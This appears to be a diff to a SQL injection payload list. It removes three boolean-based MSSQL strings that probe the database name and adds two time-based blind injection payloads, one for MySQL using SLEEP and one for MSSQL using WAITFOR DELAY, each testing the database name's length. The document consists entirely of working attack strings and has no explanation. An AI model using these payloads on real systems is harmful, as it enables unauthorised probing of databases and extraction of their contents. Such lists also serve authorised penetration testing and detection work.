@@ -1,3 +1,4 @@
-' AND DB_NAME()='DMWQA'--
-' AND DB_NAME()='dmwqa'--
-' AND DB_NAME()='DmwQa'--
+#MySQL Payload
+'%2b(select*from(select(IF(LENGTH(DATABASE())=1,FALSE,SLEEP(5))))a)%2b'
+#MSSQL Payload
+'; IF (LEN(DB_NAME()) = 1) WAITFOR DELAY '00:00:05'--
